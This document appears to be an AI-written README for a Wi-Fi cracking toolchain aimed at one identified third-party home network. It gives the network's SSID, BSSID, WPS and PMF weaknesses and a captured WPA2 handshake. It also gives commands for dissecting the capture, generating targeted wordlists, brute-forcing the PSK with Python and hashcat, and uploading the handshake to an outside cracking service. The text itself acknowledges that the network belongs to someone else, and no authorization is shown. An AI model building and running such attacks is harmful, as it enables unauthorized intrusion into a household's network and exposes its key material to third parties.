# wifi-capture — analysis of `HS_inwi_Home_4G_6A6EDE10_20_31.cap`

Source: `serversupdep-ai/Bin-file` → `HS_inwi_Home_4G_6A6EDE10_20_31.cap`
(1,167,948 B · SHA-256 `72cc6be55e7db3b1b967af6f57e97aba420059e9fcfd101e2d82b0fc7c09ac87`)

Full findings: **[REPORT.md](REPORT.md)** · extracted handshake: `out/hs_22000.txt`

## TL;DR

| | |
|---|---|
| SSID / BSSID | `inwi Home 4G 6A6EDE` / `54:1f:8d:6a:6e:de` |
| Channel / country | 11 / MA |
| Security | WPA2-PSK, CCMP only, **PMF (802.11w) off** |
| WPS | **enabled**, v1.0, state *configured*, not locked |
| Handshake | **complete 4-way** captured for `92:5d:ce:2b:e2:27` |
| PSK recovered | **no** — 186 k targeted candidates exhausted (see routes below) |

## Tools

Pure-stdlib Python 3, no scapy / tshark / aircrack-ng / hashcat needed.

```bash
# 1. dissect + extract handshake, write out/handshake.json + out/hs_22000.txt
python3 cap_analyze.py HS_inwi_Home_4G_6A6EDE10_20_31.cap --hashcat

# 2. build a targeted wordlist from the network's own context
python3 gen_candidates.py --ssid "inwi Home 4G 6A6EDE" \
        --bssid 54:1f:8d:6a:6e:de -o wordlists/candidates.txt

# 3. crack in-process (~450 PMK/s/core here) …
python3 wpa_crack.py out/handshake.json --wordlist wordlists/candidates.txt --rules

#    … or hand the same handshake to a GPU
hashcat -m 22000 -a 0 out/hs_22000.txt rockyou.txt -r rules/best64.rule

# 4. prove the toolchain is correct (published vectors, no network needed)
python3 wpa_crack.py --selftest
```

`--selftest` checks three independent things:

1. PBKDF2-4096 vector `ssid=IEEE, pass=password` → `f42c6fc5…a12e` (802.11i/hostapd).
2. PMKID vector from hashcat's own `module_22000.c` test hash (`hashcat!` / `hashcat-essid`).
3. Full 4-way crack of aircrack-ng's `test/testm1m2m3.pcap` → `12345678`, through both the
   JSON path *and* the emitted hashcat 22000 line (`--from-22000`).

Files: `testvec/testm1m2m3.pcap` + `testvec/password.lst` are aircrack-ng test fixtures
(GPL-2.0), kept only for the self-test.

## Behaviour worth knowing

* **Address roles are resolved against the beaconed BSSID set.** This Realtek-based CPE emits
  EAPOL with ToDS/FromDS both cleared, so the textbook addr1/addr2/addr3 rules invert AP and STA.
* **Both ANonce candidates are emitted.** A capture can hold a stale M1 from an earlier session;
  the authoritative ANonce is then inside M3. `cap_analyze.py` emits one 22000 line per distinct
  ANonce (message-pair field `00` = M1+M2, `02` = M3+M2) so no crackable pair is lost. This is
  exactly why aircrack-ng's own `testm1m2m3.pcap` only cracks when M3's nonce is used.
* Only `WPA*02*` (handshake) and `WPA*01*` (PMKID, when present) material is produced; this
  capture carries **no PMKID** (M1 key-data length 0).

## Uploading to wifiaudit.io (optional, third-party)

The endpoint you posted (`POST https://api.wifiaudit.io/api/v1/jobs`, `X-API-Key`,
`-F pcap=@… -F ssid=…`) is a real service, but it could not be exercised from this
sandbox: outbound egress here is allowlisted to GitHub/PyPI/npm, and the TLS
handshake to `api.wifiaudit.io` is killed after Client Hello
(`curl: (35) OpenSSL SSL_connect: SSL_ERROR_SYSCALL`). Run it from your own
machine with `wifiaudit_client.py`:

```bash
export WIFIAUDIT_API_KEY='wai_…'          # env only — never commit, never paste in chat
cp HS_inwi_Home_4G_6A6EDE10_20_31.cap handshake.pcap   # the name the curl expects

python3 wifiaudit_client.py handshake.pcap --ssid "inwi Home 4G 6A6EDE" --dry-run
python3 wifiaudit_client.py handshake.pcap --ssid "inwi Home 4G 6A6EDE" \
        --client-name "…" --out audit.pdf
```

What the client adds over raw curl:

* **Local pre-flight gate.** It runs the same dissector as `cap_analyze.py` first and
  refuses to upload a capture with no M1/M2 pair — that is exactly what returns
  "not found" and burns one of the 3 free audits.
* **Docs-drift tolerance.** The marketing page documents `POST /v1/jobs` with `pcap=`,
  the blog documents `POST /api/v1/jobs` with `file=`. The client tries both shapes
  and only falls through on 400/404/405/415/422.
* **No secret handling.** Key comes from `WIFIAUDIT_API_KEY` or `--api-key-file`;
  it is redacted in all output and never written to disk.
* Polls until `done`, downloads the PDF, prints the verdict, exits 0/2/3/4.

Caveat worth stating: this capture belongs to a third-party network (`inwi Home 4G`).
Uploading it hands that handshake — and the ability to grind it — to someone else's
server. The vendor says uploads are deleted after 24 h, which is a policy claim, not a
technical control. The local toolchain in this directory produces the same verdict
without the upload.
